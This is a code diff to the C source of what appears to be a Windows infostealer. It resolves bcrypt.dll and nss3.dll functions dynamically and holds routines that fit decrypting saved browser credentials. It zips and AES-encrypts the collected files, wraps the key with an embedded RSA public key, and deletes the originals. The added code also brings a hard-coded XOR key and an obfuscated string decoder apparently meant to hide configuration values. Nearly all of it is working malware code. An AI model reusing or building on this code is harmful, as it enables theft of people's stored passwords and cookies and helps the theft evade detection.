@@ -1,6 +1,9 @@
 #include "./../../include/crypto.h"
 #include "./../../include/global.h"
 #include "./../../include/extra.h"
+
+
+
 // Replace this with your own key generated with the tool /extra/KeyPairGenerator.c
 unsigned char PublicKey[] = {0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xC1, 0xAE, 0x2E, 0x40, 0xED,
@@ -21,6 +24,8 @@ unsigned char PublicKey[] = {0x52, 0x53, 0x41, 0x31, 0x00, 0x08, 0x00, 0x00, 0x0
         0x1F, 0xFA, 0x0A, 0xDA, 0x8A, 0xD8, 0x0B, 0x76, 0x06, 0x22, 0x0D, 0x23, 0xD4, 0x71, 0x3F, 0x7D,
         0xC5, 0x6E, 0xFC, 0x5E, 0x9F, 0x46, 0x37, 0x27, 0xF4, 0xD0, 0x95
 };
+const char *STATIC_KEY = "2l3jfezeh7";
+
 
 
 int Base64DecodingFunc(const char *input, char **outputDec, DWORD *outputDecSize) {
@@ -332,12 +337,12 @@ NTSTATUS AES_256_GCM(const BYTE *encryptedData, ULONG encryptedDataLength, const
     // Decrypt the data using the symmetric key and GCM parameters.
     status = pBCryptDecrypt(keyHandle, (PUCHAR)encryptedData, encryptedDataLength, &authInfo, NULL, 0, decryptedData, decryptedDataLength, &bytesDone, 0);
 
-    // Clean up
+    // Clean up: destroy the key and close the algorithm provider.
     pBCryptDestroyKey(keyHandle);
     pBCryptCloseAlgorithmProvider(algHandle, 0);
     UnloadLib(moduleHandle); // Unload the DLL once finished
 
-    return status; // Return status!
+    return status; // Return final status, success or failure
 }
 
 int AES_256_GCM_Setup(char *key, char *ciphertext, DWORD ciphertextSize, char *plaintext)
@@ -435,7 +440,7 @@ int AES_256_GCM_Setup(char *key, char *ciphertext, DWORD ciphertextSize, char *p
 
 int Decrypt_NSS3(char *profile_path, char *crypted, char **outcrypt)
 {
-    // Load the nss3.dll file to use the NSS3 decryption functions.
+    // Load the nss3.dll file to use the NSS3 decryption functions. (We have already changed dir so the dll exists!)
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"nss3.dll";
     dllName.Length = (USHORT)(wcslen(dllNameBuffer) * sizeof(WCHAR));
@@ -647,7 +652,8 @@ int CompressFile(const WCHAR **Files, size_t numFiles, const WCHAR *OutputPath) 
 }
 
 int RSAEncrypt(char *file, char *fileOut) {
-    OKAY("Starting to encrypt ZIP file with AES; and RSA encrypting AES encryption key.");
+    INFO("Starting to encrypt ZIP file with AES; and RSA encrypting AES encryption key.");
+
     // Dynamically load bcrypt.dll using NTAPI equivalent of LoadLibrary.
     UNICODE_STRING dllName;
     WCHAR dllNameBuffer[] = L"bcrypt.dll";                            // The DLL containing cryptographic functions
@@ -664,7 +670,7 @@ int RSAEncrypt(char *file, char *fileOut) {
         WARN("Failed to load bcrypt.dll. STATUS: %08x\n", STATUS);
         return -1;
     } else {
-        INFO("bcrypt.dll loaded successfully\n");
+        INFO("bcrypt.dll loaded successfully.");
     }
 
     // Retrieve the address of BCryptOpenAlgorithmProvider function from bcrypt.dll.
@@ -681,7 +687,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptOpenAlgorithmProvider_t pBCryptOpenAlgorithmProvider = (BCryptOpenAlgorithmProvider_t)BCryptOpenAlgorithmProviderProcAddress;
-    INFO("BCryptOpenAlgorithmProvider loaded successfully\n");
 
     // Retrieve the address of BCryptImportKeyPair function from bcrypt.dll.
     ANSI_STRING procName1;
@@ -697,7 +702,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptImportKeyPair_t pBCryptImportKeyPair = (BCryptImportKeyPair_t)BCryptImportKeyPairProcAddress;
-    INFO("BCryptImportKeyPair loaded successfully\n");
 
     // Retrieve the address of BCryptCloseAlgorithmProvider function from bcrypt.dll.
     ANSI_STRING procName2;
@@ -713,7 +717,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider = (BCryptCloseAlgorithmProvider_t)BCryptCloseAlgorithmProviderProcAddress;
-    INFO("BCryptCloseAlgorithmProvider loaded successfully\n");
 
     // Retrieve the address of BCryptEncrypt function from bcrypt.dll.
     ANSI_STRING procName3;
@@ -729,7 +732,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptEncrypt_t pBCryptEncrypt = (BCryptEncrypt_t)BCryptEncryptProcAddress;
-    INFO("BCryptEncrypt loaded successfully\n");
 
     // Retrieve the address of BCryptDestroyKey function from bcrypt.dll.
     ANSI_STRING procName4;
@@ -745,7 +747,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptDestroyKey_t pBCryptDestroyKey = (BCryptDestroyKey_t)BCryptDestroyKeyProcAddress;
-    INFO("BCryptDestroyKey loaded successfully\n");
 
     // Retrieve the address of BCryptGenRandom function from bcrypt.dll.
     ANSI_STRING procName5;
@@ -761,7 +762,6 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptGenRandom_t pBCryptGenRandom = (BCryptGenRandom_t)BCryptGenRandomProcAddress;
-    INFO("BCryptGenRandom loaded successfully\n");
 
     // Retrieve the address of BCryptGenRandom function from bcrypt.dll.
     ANSI_STRING procName6;
@@ -777,7 +777,9 @@ int RSAEncrypt(char *file, char *fileOut) {
         return -2;
     }
     BCryptGenerateSymmetricKey_t pBCryptGenerateSymmetricKey = (BCryptGenerateSymmetricKey_t)BCryptGenerateSymmetricKeyProcAddress;
-    INFO("BCryptGenerateSymmetricKey loaded successfully\n");
+
+
+    INFO("Got addresses of all needed functions from bcrypt.dll");
 
 
 
@@ -817,7 +819,7 @@ int RSAEncrypt(char *file, char *fileOut) {
     BCRYPT_KEY_HANDLE hKeyAes = NULL;
     statusAES = pBCryptGenerateSymmetricKey(hAesAlg, &hKeyAes, NULL, 0, aesKey, sizeof(aesKey), 0);
     if (!NT_SUCCESS(statusAES)) {
-        WARN("BCryptGenerateSymmetricKey failed: 0x%x\n", statusAES);
+        WARN("BCryptGenerateSymmetricKey failed: 0x%x", statusAES);
         pBCryptCloseAlgorithmProvider(hAesAlg, 0);
         return -1;
     }
@@ -825,7 +827,7 @@ int RSAEncrypt(char *file, char *fileOut) {
     ULONG AESencryptedBufferSize = 0;
     statusAES = pBCryptEncrypt(hKeyAes, (PUCHAR)FileDataBuffer, InputDataSize, NULL, iv, sizeof(iv), NULL, 0, &AESencryptedBufferSize, 0x00000001);
     if (!NT_SUCCESS(statusAES)) {
-        WARN("Failed to get required size for AES encrypted buffer..statusAES: 0x%x\n", statusAES);
+        WARN("Failed to get required size for AES encrypted buffer..statusAES: 0x%x", statusAES);
         pBCryptDestroyKey(hKeyAes);
         pBCryptCloseAlgorithmProvider(hAesAlg, 0);
         free(FileDataBuffer);
@@ -833,7 +835,7 @@ int RSAEncrypt(char *file, char *fileOut) {
     }
     PUCHAR AESencryptedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, AESencryptedBufferSize);
     if (AESencryptedBuffer == NULL) {
-        WARN("Failed to allocate memory for encrypted buffer\n");
+        WARN("Failed to allocate memory for encrypted buffer.");
         pBCryptDestroyKey(hKeyAes);
         pBCryptCloseAlgorithmProvider(hAesAlg, 0);
         free(FileDataBuffer);
@@ -841,7 +843,7 @@ int RSAEncrypt(char *file, char *fileOut) {
     }
     statusAES = pBCryptEncrypt(hKeyAes, (PUCHAR)FileDataBuffer, InputDataSize, NULL, iv, sizeof(iv), AESencryptedBuffer, AESencryptedBufferSize, &AESencryptedBufferSize, BCRYPT_BLOCK_PADDING);
     if (!NT_SUCCESS(statusAES)) {
-        WARN("Failed to encrypt file data using AES..statusAES: 0x%x\n", statusAES);
+        WARN("Failed to encrypt file data using AES..statusAES: 0x%x", statusAES);
         HeapFree(GetProcessHeap(), 0, AESencryptedBuffer);
         pBCryptDestroyKey(hKeyAes);
         pBCryptCloseAlgorithmProvider(hAesAlg, 0);
@@ -867,21 +869,21 @@ int RSAEncrypt(char *file, char *fileOut) {
     // Open an algorithm handle for RSA
     status = pBCryptOpenAlgorithmProvider(&hAlgorithm, L"RSA", NULL, 0);
     if (!NT_SUCCESS(status)) {
-        WARN("BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
+        WARN("BCryptOpenAlgorithmProvider failed: 0x%x", status);
         return -1;
     }
 
     // Import the public key for encryption
     status = pBCryptImportKeyPair(hAlgorithm, NULL, L"RSAPUBLICBLOB", &hKey, PublicKey, PublicKeyLength, 0x00000008);
     if (!NT_SUCCESS(status)) {
-        WARN("Failed to import public key..status : %08x\n", status);
+        WARN("Failed to import public key..status : %08x", status);
         pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
         return -1;
     }
     // Get the required size for the encrypted buffer
     status = pBCryptEncrypt(hKey, aesKey, 32, NULL, NULL, 0, NULL, 0, &encryptedBufferSize, 0x00000002);
     if (!NT_SUCCESS(status)) {
-        WARN("Failed to get required size of buffer..status : %08x\n", status);
+        WARN("Failed to get required size of buffer..status : %08x", status);
         pBCryptDestroyKey(hKey);
         pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
         return -1;
@@ -890,14 +892,14 @@ int RSAEncrypt(char *file, char *fileOut) {
     // Allocate memory for the encrypted buffer
     encryptedBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, encryptedBufferSize);
     if (encryptedBuffer == NULL) {
-        WARN("Failed to allocate memory for encrypted buffer\n");
+        WARN("Failed to allocate memory for encrypted buffer.");
         pBCryptDestroyKey(hKey);
         pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
         return -1;
     }
     status = pBCryptEncrypt(hKey, aesKey, 32, NULL, NULL, 0, encryptedBuffer, encryptedBufferSize, &encryptedBufferSize, 0x00000002);
     if (!NT_SUCCESS(status)) {
-        WARN("Failed to encrypt data..status : %08x\n", status);
+        WARN("Failed to encrypt data..status : %08x", status);
         HeapFree(GetProcessHeap(), 0, encryptedBuffer);
         pBCryptDestroyKey(hKey);
         pBCryptCloseAlgorithmProvider(hAlgorithm, 0); 
@@ -905,33 +907,603 @@ int RSAEncrypt(char *file, char *fileOut) {
     }
 
     // Print the AES Key and the RSA Encrypted AES Key (because of verbose version!)
-    OKAY("AES Encryption key:\n");
+    INFO("AES Encryption key:");
     PrintHex(aesKey, 32);
 
-    OKAY("RSA Encrypted AES Encryption Key:\n");
+    INFO("RSA Encrypted AES Encryption Key:");
     PrintHex(encryptedBuffer, encryptedBufferSize);
+
+
+
 
     // Base64 encode the RSA Encrypted key
     char base64EncodedRSAEncryptedKey[500];
     DWORD base64EncodedRSAEncryptedKeySize = sizeof(base64EncodedRSAEncryptedKey);
     Base64EncodingFunc(encryptedBuffer, encryptedBufferSize, base64EncodedRSAEncryptedKey, base64EncodedRSAEncryptedKeySize);
-    OKAY("BASE64 Encoded (RSA Encrypted AES Key):\n%s\n\n", base64EncodedRSAEncryptedKey);
+    INFO("BASE64 Encoded (RSA Encrypted AES Key):\n%s", base64EncodedRSAEncryptedKey);
 
-    // Write the AES encrypted data to the output file
-    FILE *OutputWrite = fopen(fileOut,"wb");
-    fwrite(AESencryptedBuffer, AESencryptedBufferSize, 1, OutputWrite);
+    // Concatenate the AESencryptedBuffer + Magic string ("gSdsA") + Base64 encoded key. Afterwards write it to the output file.
+    DWORD magicStringSize = strlen("gSdsA");
+    DWORD base64EncodedRSAEncryptedKeySizeDword = strlen(base64EncodedRSAEncryptedKey);
+    BYTE *FULLENCRYPTFILEDATA = (BYTE *)malloc(AESencryptedBufferSize + magicStringSize + base64EncodedRSAEncryptedKeySizeDword);
+    memcpy(FULLENCRYPTFILEDATA, AESencryptedBuffer, AESencryptedBufferSize);
+    memcpy(FULLENCRYPTFILEDATA + AESencryptedBufferSize, "gSdsA", magicStringSize);
+    memcpy(FULLENCRYPTFILEDATA + AESencryptedBufferSize + magicStringSize, base64EncodedRSAEncryptedKey, base64EncodedRSAEncryptedKeySizeDword);
+
+    // Write the AES encrypted data, magic string and Base64 encoded RSA output.
+    FILE *OutputWrite = fopen(fileOut, "wb");
+    if (OutputWrite == NULL) {
+        WARN("Failed to open the output file.");
+        free(FULLENCRYPTFILEDATA);
+        return -1;
+    }
+    fwrite(FULLENCRYPTFILEDATA, AESencryptedBufferSize + magicStringSize + base64EncodedRSAEncryptedKeySizeDword, 1, OutputWrite);
     fclose(OutputWrite);
 
 
     // Cleanup
-    HeapFree(GetProcessHeap(), 0, encryptedBuffer);
-    HeapFree(GetProcessHeap(), 0, AESencryptedBuffer);
-    pBCryptCloseAlgorithmProvider(hAlgorithm, 0);
-    pBCryptCloseAlgorithmProvider(hAesAlg, 0);
-    pBCryptDestroyKey(hKey);
-    pBCryptDestroyKey(hKeyAes);
-    free(FileDataBuffer);
-    UnloadLib(moduleHandle);
-    unlink(file); // Remove the non-encrypted input file
+    HeapFree(GetProcessHeap(), 0, encryptedBuffer);    // Free heap allocation RSA encrypted AES key.
+    HeapFree(GetProcessHeap(), 0, AESencryptedBuffer); // Free heap allocation for AES encrypted data.
+    pBCryptCloseAlgorithmProvider(hAlgorithm, 0);      // Close Algorithm Provider.
+    pBCryptCloseAlgorithmProvider(hAesAlg, 0);         // Close Algorithm Provider.
+    pBCryptDestroyKey(hKey);                           // Destroy BCRYPT_KEY_HANDLE.
+    pBCryptDestroyKey(hKeyAes);                        // Destroy BCRYPT_KEY_HANDLE.
+    free(FULLENCRYPTFILEDATA);                         // Free the buffer used to store full output file data.
+    free(FileDataBuffer);                              // Free the buffer used to store the ZIP file data.
+    UnloadLib(moduleHandle);                           // Unload the DLL loaded through NtAPI LoadLibrary.
+    unlink(file);                                      // Remove the non-encrypted input file.
+
     return 0;
+}
+
+void AddRandomBytes(unsigned char *input, size_t length) {
+    // 3 Uncommon bytes to add between the input byte array (* 3). We take 5 of them randomly.
+    unsigned char uncommon_bytes[9] = {0xF1, 0xAA, 0xC3, 0xF1, 0xAA, 0xC3, 0xF1, 0xAA, 0xC3};
+
+    unsigned char *new_memory = malloc(length + 5);
+    for (size_t i = 0; i < length + 5; i++) { new_memory[i] = 0x00; }
+    srand(time(NULL));
+
+    for (int i = 0; i < 5; i++) {
+        unsigned char random_byte = uncommon_bytes[rand() % 9];
+        size_t random_position;
+        do {
+            random_position = (rand() % (length + 4)) + 1;
+        } while (new_memory[random_position] != 0x00);
+        
+        new_memory[random_position] = random_byte;
+    }
+
+    size_t input_index = 0;
+    for (size_t i = 0; i < length + 5; i++) {
+        if (new_memory[i] == 0x00 && input_index < length) {
+            new_memory[i] = input[input_index++];
+        }
+    }
+
+    memcpy(input, new_memory, length + 5);
+    free(new_memory);
+    return;
+}
+
+void RemoveBytes(unsigned char *ByteArr, int ByteArrLength) {
+    int new_len = ByteArrLength - 5;
+    unsigned char *cleaned = malloc(new_len);
+    int index = 0;
+
+    // Loop through the char array and remove the "uncommon" characters.
+    for (int i = 0; i < ByteArrLength; i++) {
+        if ((ByteArr[i] != 0xF1) &&
+            (ByteArr[i] != 0xAA) &&
+            (ByteArr[i] != 0xC3) ) {
+                cleaned[index] = ByteArr[i];
+                index += 1;
+            }
+    }
+    memcpy(ByteArr, cleaned, new_len);
+    free(cleaned);
+    return;
+}
+void XOR(char *input, char *output, const char *key, int length)
+{
+    int key_len = strlen(key);
+    for (int i = 0; i < length; ++i)
+        output[i] = input[i] ^ key[i % key_len];
+}
+void Reverse(unsigned char *data, int len)
+{
+    for (int i = 0; i < len / 2; ++i)
+    {
+        unsigned char temp = data[i];
+        data[i] = data[len - i - 1];
+        data[len - i - 1] = temp;
+    }
+}
+
+char *BizFumEncodingDecode(char *Input)
+{
+    // Step 1: Base64 Decode.
+    char *in = NULL;
+    DWORD inSize;
+    Base64DecodingFunc(Input, &in, &inSize);
+
+
+    // Step 2: Split back into pieces.
+    int Remainder = in[inSize - 2] - '0';
+    int BaseSize = in[inSize - 1] - '0';
+
+    int Offset = 0;
+    unsigned char *STR14;
+    unsigned char *STR1 = malloc(5);
+    unsigned char *STR2 = malloc(5);
+    unsigned char *STR3 = malloc(5);
+    unsigned char *STR4 = malloc(5);
+    unsigned char *STR5 = malloc(5);
+    unsigned char *STR6 = malloc(5);
+    unsigned char *STR7 = malloc(5);
+    unsigned char *STR8 = malloc(5);
+    unsigned char *STR9 = malloc(5);
+    unsigned char *STR10 = malloc(5);
+    unsigned char *STR11 = malloc(5);
+    unsigned char *STR12 = malloc(5);
+    unsigned char *STR13 = malloc(5);
+    unsigned char *LeftOver = malloc(Remainder);
+    if (BaseSize == 9)
+    {
+        STR14 = malloc(5);
+    }
+
+    if (Remainder > 0)
+    {
+        memcpy(LeftOver, in + Offset, Remainder);
+        Offset += Remainder;
+    }
+    if (BaseSize == 9)
+    {
+        memcpy(STR14, in + Offset, 5);
+        Offset += 5;
+    }
+    memcpy(STR13, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR12, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR11, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR10, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR9, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR8, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR7, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR6, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR5, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR4, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR3, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR2, in + Offset, 5);
+    Offset += 5;
+    memcpy(STR1, in + Offset, 5);
+    Offset += 5;
+
+    Reverse(STR1, 5);
+    Reverse(STR2, 5);
+    Reverse(STR3, 5);
+    Reverse(STR4, 5);
+    Reverse(STR5, 5);
+    Reverse(STR6, 5);
+    Reverse(STR7, 5);
+    Reverse(STR8, 5);
+    Reverse(STR9, 5);
+    Reverse(STR10, 5);
+    Reverse(STR11, 5);
+    Reverse(STR12, 5);
+    Reverse(STR13, 5);
+    if (BaseSize == 9)
+    {
+        Reverse(STR14, 5);
+    }
+    if (Remainder > 0)
+    {
+        Reverse(LeftOver, Remainder);
+    }
+
+
+
+    // Step 3: Flip back the bytes.
+    // Here we are basically flipping the rows from X-axis to Y-axis, but in reverse way.
+    // Example:
+    // 04 05       becomes      04 01 09
+    // 01 02                    05 02 05
+    // 09 05
+    int MaxRow;
+    if (BaseSize == 9)
+    {
+        MaxRow = 14;
+    }
+    else
+    {
+        MaxRow = 13;
+    }
+    unsigned char *XOR1withRandomBytes = malloc(MaxRow);
+    unsigned char *XOR2withRandomBytes = malloc(MaxRow);
+    unsigned char *XOR3withRandomBytes = malloc(MaxRow);
+    unsigned char *XOR4withRandomBytes = malloc(MaxRow);
+    unsigned char *XOR5withRandomBytes = malloc(MaxRow + Remainder);
+    int STRindex = 0;
+
+    for (int i = 0; i < MaxRow; i++)
+    {
+        if (i == 0)
+        {
+            XOR1withRandomBytes[i] = STR1[STRindex];
+        }
+        if (i == 1)
+        {
+            XOR1withRandomBytes[i] = STR2[STRindex];
+        }
+        if (i == 2)
+        {
+            XOR1withRandomBytes[i] = STR3[STRindex];
+        }
+        if (i == 3)
+        {
+            XOR1withRandomBytes[i] = STR4[STRindex];
+        }
+        if (i == 4)
+        {
+            XOR1withRandomBytes[i] = STR5[STRindex];
+        }
+        if (i == 5)
+        {
+            XOR1withRandomBytes[i] = STR6[STRindex];
+        }
+        if (i == 6)
+        {
+            XOR1withRandomBytes[i] = STR7[STRindex];
+        }
+        if (i == 7)
+        {
+            XOR1withRandomBytes[i] = STR8[STRindex];
+        }
+        if (i == 8)
+        {
+            XOR1withRandomBytes[i] = STR9[STRindex];
+        }
+        if (i == 9)
+        {
+            XOR1withRandomBytes[i] = STR10[STRindex];
+        }
+        if (i == 10)
+        {
+            XOR1withRandomBytes[i] = STR11[STRindex];
+        }
+        if (i == 11)
+        {
+            XOR1withRandomBytes[i] = STR12[STRindex];
+        }
+        if (i == 12)
+        {
+            XOR1withRandomBytes[i] = STR13[STRindex];
+        }
+        if ((i == 13) && MaxRow == 14)
+        {
+            XOR1withRandomBytes[i] = STR14[STRindex];
+        }
+    }
+    STRindex += 1;
+    for (int i = 0; i < MaxRow; i++)
+    {
+        if (i == 0)
+        {
+            XOR2withRandomBytes[i] = STR1[STRindex];
+        }
+        if (i == 1)
+        {
+            XOR2withRandomBytes[i] = STR2[STRindex];
+        }
+        if (i == 2)
+        {
+            XOR2withRandomBytes[i] = STR3[STRindex];
+        }
+        if (i == 3)
+        {
+            XOR2withRandomBytes[i] = STR4[STRindex];
+        }
+        if (i == 4)
+        {
+            XOR2withRandomBytes[i] = STR5[STRindex];
+        }
+        if (i == 5)
+        {
+            XOR2withRandomBytes[i] = STR6[STRindex];
+        }
+        if (i == 6)
+        {
+            XOR2withRandomBytes[i] = STR7[STRindex];
+        }
+        if (i == 7)
+        {
+            XOR2withRandomBytes[i] = STR8[STRindex];
+        }
+        if (i == 8)
+        {
+            XOR2withRandomBytes[i] = STR9[STRindex];
+        }
+        if (i == 9)
+        {
+            XOR2withRandomBytes[i] = STR10[STRindex];
+        }
+        if (i == 10)
+        {
+            XOR2withRandomBytes[i] = STR11[STRindex];
+        }
+        if (i == 11)
+        {
+            XOR2withRandomBytes[i] = STR12[STRindex];
+        }
+        if (i == 12)
+        {
+            XOR2withRandomBytes[i] = STR13[STRindex];
+        }
+        if ((i == 13) && MaxRow == 14)
+        {
+            XOR2withRandomBytes[i] = STR14[STRindex];
+        }
+    }
+    STRindex += 1;
+    for (int i = 0; i < MaxRow; i++)
+    {
+        if (i == 0)
+        {
+            XOR3withRandomBytes[i] = STR1[STRindex];
+        }
+        if (i == 1)
+        {
+            XOR3withRandomBytes[i] = STR2[STRindex];
+        }
+        if (i == 2)
+        {
+            XOR3withRandomBytes[i] = STR3[STRindex];
+        }
+        if (i == 3)
+        {
+            XOR3withRandomBytes[i] = STR4[STRindex];
+        }
+        if (i == 4)
+        {
+            XOR3withRandomBytes[i] = STR5[STRindex];
+        }
+        if (i == 5)
+        {
+            XOR3withRandomBytes[i] = STR6[STRindex];
+        }
+        if (i == 6)
+        {
+            XOR3withRandomBytes[i] = STR7[STRindex];
+        }
+        if (i == 7)
+        {
+            XOR3withRandomBytes[i] = STR8[STRindex];
+        }
+        if (i == 8)
+        {
+            XOR3withRandomBytes[i] = STR9[STRindex];
+        }
+        if (i == 9)
+        {
+            XOR3withRandomBytes[i] = STR10[STRindex];
+        }
+        if (i == 10)
+        {
+            XOR3withRandomBytes[i] = STR11[STRindex];
+        }
+        if (i == 11)
+        {
+            XOR3withRandomBytes[i] = STR12[STRindex];
+        }
+        if (i == 12)
+        {
+            XOR3withRandomBytes[i] = STR13[STRindex];
+        }
+        if ((i == 13) && MaxRow == 14)
+        {
+            XOR3withRandomBytes[i] = STR14[STRindex];
+        }
+    }
+    STRindex += 1;
+    for (int i = 0; i < MaxRow; i++)
+    {
+        if (i == 0)
+        {
+            XOR4withRandomBytes[i] = STR1[STRindex];
+        }
+        if (i == 1)
+        {
+            XOR4withRandomBytes[i] = STR2[STRindex];
+        }
+        if (i == 2)
+        {
+            XOR4withRandomBytes[i] = STR3[STRindex];
+        }
+        if (i == 3)
+        {
+            XOR4withRandomBytes[i] = STR4[STRindex];
+        }
+        if (i == 4)
+        {
+            XOR4withRandomBytes[i] = STR5[STRindex];
+        }
+        if (i == 5)
+        {
+            XOR4withRandomBytes[i] = STR6[STRindex];
+        }
+        if (i == 6)
+        {
+            XOR4withRandomBytes[i] = STR7[STRindex];
+        }
+        if (i == 7)
+        {
+            XOR4withRandomBytes[i] = STR8[STRindex];
+        }
+        if (i == 8)
+        {
+            XOR4withRandomBytes[i] = STR9[STRindex];
+        }
+        if (i == 9)
+        {
+            XOR4withRandomBytes[i] = STR10[STRindex];
+        }
+        if (i == 10)
+        {
+            XOR4withRandomBytes[i] = STR11[STRindex];
+        }
+        if (i == 11)
+        {
+            XOR4withRandomBytes[i] = STR12[STRindex];
+        }
+        if (i == 12)
+        {
+            XOR4withRandomBytes[i] = STR13[STRindex];
+        }
+        if ((i == 13) && MaxRow == 14)
+        {
+            XOR4withRandomBytes[i] = STR14[STRindex];
+        }
+    }
+    STRindex += 1;
+    for (int i = 0; i < MaxRow + Remainder; i++)
+    {
+        if (i == 0)
+        {
+            XOR5withRandomBytes[i] = STR1[STRindex];
+        }
+        if (i == 1)
+        {
+            XOR5withRandomBytes[i] = STR2[STRindex];
+        }
+        if (i == 2)
+        {
+            XOR5withRandomBytes[i] = STR3[STRindex];
+        }
+        if (i == 3)
+        {
+            XOR5withRandomBytes[i] = STR4[STRindex];
+        }
+        if (i == 4)
+        {
+            XOR5withRandomBytes[i] = STR5[STRindex];
+        }
+        if (i == 5)
+        {
+            XOR5withRandomBytes[i] = STR6[STRindex];
+        }
+        if (i == 6)
+        {
+            XOR5withRandomBytes[i] = STR7[STRindex];
+        }
+        if (i == 7)
+        {
+            XOR5withRandomBytes[i] = STR8[STRindex];
+        }
+        if (i == 8)
+        {
+            XOR5withRandomBytes[i] = STR9[STRindex];
+        }
+        if (i == 9)
+        {
+            XOR5withRandomBytes[i] = STR10[STRindex];
+        }
+        if (i == 10)
+        {
+            XOR5withRandomBytes[i] = STR11[STRindex];
+        }
+        if (i == 11)
+        {
+            XOR5withRandomBytes[i] = STR12[STRindex];
+        }
+        if (i == 12)
+        {
+            XOR5withRandomBytes[i] = STR13[STRindex];
+        }
+        if ((i == 13) && MaxRow == 14)
+        {
+            XOR5withRandomBytes[i] = STR14[STRindex];
+        }
+    }
+    STRindex += 1;
+    for (int i = 0; i < Remainder; i++)
+    {
+        if (Remainder > 0)
+        {
+            if (MaxRow == 14)
+            {
+                XOR5withRandomBytes[14 + i] = LeftOver[i];
+            }
+            if (MaxRow == 13)
+            {
+                XOR5withRandomBytes[13 + i] = LeftOver[i];
+            }
+        }
+    }
+
+
+
+    // Step 4: Remove added random bytes.
+    int PART1_AfterRandRemove = MaxRow - 5;
+    int PART2_AfterRandRemove = MaxRow - 5;
+    int PART3_AfterRandRemove = MaxRow - 5;
+    int PART4_AfterRandRemove = MaxRow - 5;
+    int PART5_AfterRandRemove = MaxRow + Remainder - 5;
+    RemoveBytes(XOR1withRandomBytes, MaxRow);
+    RemoveBytes(XOR2withRandomBytes, MaxRow);
+    RemoveBytes(XOR3withRandomBytes, MaxRow);
+    RemoveBytes(XOR4withRandomBytes, MaxRow);
+    RemoveBytes(XOR5withRandomBytes, MaxRow + Remainder);
+
+
+    // Step 5: XOR Decrypt.
+    char PART1[11];
+    char PART2[11];
+    char PART3[11];
+    char PART4[11];
+    char PART5[11];
+    XOR(XOR1withRandomBytes, PART1, STATIC_KEY, PART1_AfterRandRemove);
+    XOR(XOR2withRandomBytes, PART2, STATIC_KEY, PART2_AfterRandRemove);
+    XOR(XOR3withRandomBytes, PART3, STATIC_KEY, PART3_AfterRandRemove);
+    XOR(XOR4withRandomBytes, PART4, STATIC_KEY, PART4_AfterRandRemove);
+    XOR(XOR5withRandomBytes, PART5, STATIC_KEY, PART5_AfterRandRemove);
+    PART1[BaseSize]             = '\0';
+    PART2[BaseSize]             = '\0';
+    PART3[BaseSize]             = '\0';
+    PART4[BaseSize]             = '\0';
+    PART5[BaseSize + Remainder] = '\0';
+    
+    // Quick check to make sure that all are over 0 characters long; if not, run the function again, with the same input, until all are > 0.
+    if ( (strlen(PART1) <= 1) || (strlen(PART2) <= 1) || (strlen(PART3) <= 1) || (strlen(PART4) <= 1) || (strlen(PART5) <= 1) ) {
+        free(XOR1withRandomBytes);
+        free(XOR2withRandomBytes);
+        free(XOR3withRandomBytes);
+        free(XOR4withRandomBytes);
+        free(XOR5withRandomBytes);
+        BizFumEncodingDecode(Input);
+    }
+
+    
+    // Step 6: Concatinate strings.
+    static char output[50]; // I know this is not the smartest way probably, but shall NOT cause problems, since the function is only ever called once.
+    sprintf(output, "%s%s%s%s%s", PART1, PART2, PART3, PART4, PART5);
+
+
+    // Clean
+    free(XOR1withRandomBytes);
+    free(XOR2withRandomBytes);
+    free(XOR3withRandomBytes);
+    free(XOR4withRandomBytes);
+    free(XOR5withRandomBytes);
+    return output;
 }
